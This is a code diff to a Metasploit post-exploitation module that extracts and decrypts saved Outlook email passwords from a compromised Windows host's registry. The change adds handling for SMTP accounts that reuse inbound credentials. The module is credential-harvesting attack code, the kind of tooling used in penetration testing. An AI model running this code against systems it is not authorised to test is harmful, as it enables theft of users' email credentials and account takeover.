@@ -1,4 +1,4 @@
-# $Id$
+# $Id: outlook.rb 14835 2012-03-01 22:15:05Z rapid7 $
 
 ##
 # This file is part of the Metasploit Framework and may be subject to
@@ -22,16 +22,16 @@ class Metasploit3 < Msf::Post
 		super( update_info( info,
 				'Name'          => 'Windows Gather Microsoft Outlook Saved Password Extraction',
 				'Description'   => %q{
-					This module extracts and attempts to decrypt saved Microsoft
+					This module extracts and decrypts saved Microsoft
 					Outlook (versions 2002-2010) passwords from the Windows
 					Registry for POP3/IMAP/SMTP/HTTP accounts.
 					In order for decryption to be successful, this module must be
-					executed with the same privileges as the user which originally
+					executed under the same privileges as the user which originally
 					encrypted the password.
 				},
 				'License'       => MSF_LICENSE,
 				'Author'        => [ 'Justin Cacak'],
-				'Version'       => '$Revision$',
+				'Version'       => '$Revision: 14835 $',
 				'Platform'      => [ 'windows' ],
 				'SessionTypes'  => [ 'meterpreter' ]
 			))
@@ -113,6 +113,7 @@ class Metasploit3 < Msf::Post
 				if smtp_use_auth != nil
 					smtp_user = get_valdata(k, 'SMTP User')
 					smtp_password = get_valdata(k, 'SMTP Password')
+					smtp_auth_method = get_valdata(k, 'SMTP Auth Method')
 				end
 
 				if pop3_server != nil
@@ -126,7 +127,7 @@ class Metasploit3 < Msf::Post
 				end
 
 				#Decrypt password and output results.  Need to do each separately due to the way Microsoft stores them.
-				print_status("Account Found:")
+				print_good("Account Found:")
 				print_status("     Type: #{type}")
 				print_status("     User Display Name: #{displayname}")
 				print_status("     User E-mail Address: #{email}")
@@ -172,16 +173,22 @@ class Metasploit3 < Msf::Post
 						portnum = pop3_port
 					end
 
-					if smtp_use_auth == nil    # Account for SMTP servers requiring authentication
+					if smtp_use_auth == nil     # Account for SMTP servers requiring authentication
 						print_status("     Outgoing Mail Server (SMTP): #{smtp_server}")
 					else
 						print_status("     Outgoing Mail Server (SMTP): #{smtp_server}   [Authentication Required]")
+						# Check if smtp_auth_method is null.  If so, the inbound credentials are utilized
+						if smtp_auth_method == nil
+							smtp_user = pop3_user
+							smtp_decrypted_password = pass
+						else
+							smtp_password.slice!(0,1)
+							smtp_decrypted_password = decrypt_password(smtp_password)
+						end
 						print_status("     Outgoing Mail Server (SMTP) User Name: #{smtp_user}")
-						smtp_password.slice!(0,1)
-						smtp_decrypted_password = decrypt_password(smtp_password)
 						print_status("     Outgoing Mail Server (SMTP) Password: #{smtp_decrypted_password}")
 					end
-
+								
 					smtp_use_ssl = get_valdata(k, 'SMTP Use SSL')
 					if smtp_use_ssl == nil
 						print_status("     SMTP Use SSL: No")
@@ -271,9 +278,15 @@ class Metasploit3 < Msf::Post
 						print_status("     Outgoing Mail Server (SMTP): #{smtp_server}")
 					else
 						print_status("     Outgoing Mail Server (SMTP): #{smtp_server}   [Authentication Required]")
+						# Check if smtp_auth_method is null.  If so, the inbound credentials are utilized
+						if smtp_auth_method == nil
+							smtp_user = imap_user
+							smtp_decrypted_password = pass
+						else
+							smtp_password.slice!(0,1)
+							smtp_decrypted_password = decrypt_password(smtp_password)
+						end
 						print_status("     Outgoing Mail Server (SMTP) User Name: #{smtp_user}")
-						smtp_password.slice!(0,1)
-						smtp_decrypted_password = decrypt_password(smtp_password)
 						print_status("     Outgoing Mail Server (SMTP) Password: #{smtp_decrypted_password}")
 					end
 
